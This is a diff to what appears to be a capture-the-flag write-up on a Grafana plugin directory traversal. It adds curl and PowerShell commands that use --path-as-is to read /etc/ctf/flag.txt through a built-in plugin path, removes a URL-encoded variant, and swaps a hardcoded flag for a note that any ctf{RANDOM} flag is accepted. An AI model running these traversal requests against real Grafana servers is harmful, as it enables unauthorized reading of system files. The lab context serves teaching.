@@ -10,19 +10,19 @@ allowing directory traversal outside the plugin directory.
 
 Any built-in plugin ID works. Use `alertlist` as the anchor:
 
+**Linux / macOS**
 ```sh
-curl http://localhost:8080/public/plugins/alertlist/../../../../../../../../../etc/ctf/flag.txt
+curl --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag.txt"
 ```
 
-Or with URL encoding if the raw traversal is blocked by a proxy:
-
-```sh
-curl "http://localhost:8080/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fctf%2Fflag.txt"
+**Windows (PowerShell)**
+```powershell
+curl.exe --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag.txt"
 ```
 
 ## Flag
 
-`ctf{grafana_traversal_8x}`
+Any flag in format `ctf{RANDOM}` is correct. 
 
 ## Fix
 
